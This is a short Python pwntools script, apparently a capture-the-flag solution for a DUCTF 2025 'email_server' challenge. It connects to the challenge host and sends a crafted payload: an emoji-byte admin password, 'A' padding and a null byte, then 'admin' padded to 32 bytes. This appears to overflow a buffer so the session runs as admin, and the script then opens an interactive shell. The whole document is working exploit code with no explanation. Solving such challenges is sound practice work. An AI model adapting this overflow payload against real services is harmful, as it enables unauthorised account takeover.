from pwn import *

# p = process('./email_server')
p = remote("chal.2025.ductf.net", 30000)

admin_pw = b'\xf0\x9f\x87\xa6\xf0\x9f\x87\xa9\xf0\x9f\x87\xb2\xf0\x9f\x87\xae\xf0\x9f\x87\xb3\x00'

payload = admin_pw + b"A"*(31 - len(admin_pw)) + b'\x00'
payload += b"admin".ljust(32, b"\x00")

print('[*] admin_pw length:', len(admin_pw))
print('[*] payload length:', len(payload))
print('[*] payload:', payload)

p.sendline(b"test")

p.sendline(payload)

p.interactive()